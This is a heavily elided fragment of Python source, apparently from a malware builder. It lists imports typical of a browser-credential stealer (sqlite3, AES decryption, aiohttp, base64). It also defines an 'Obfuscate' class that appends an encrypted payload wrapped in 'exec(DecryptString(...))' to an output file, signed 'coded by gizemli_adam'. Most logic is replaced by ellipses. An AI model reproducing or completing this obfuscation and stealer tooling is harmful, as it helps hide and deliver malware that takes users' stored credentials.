...
Infinity_Modules = "import ctypes, platform ,json, sys, shutil, sqlite3\nimport re, os, asyncio, aiohttp, time, base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend"
Decrypt_Func_Script = """
...
class Obfuscate:
    ...
    def Main(self) -> None:
        ...
        with open(self.output_path, "ab") as file:
            ...
            file.write(
                b"exec(DecryptString(key, tag, nonce, encrypted_data))# coded by gizemli_adam"
            )
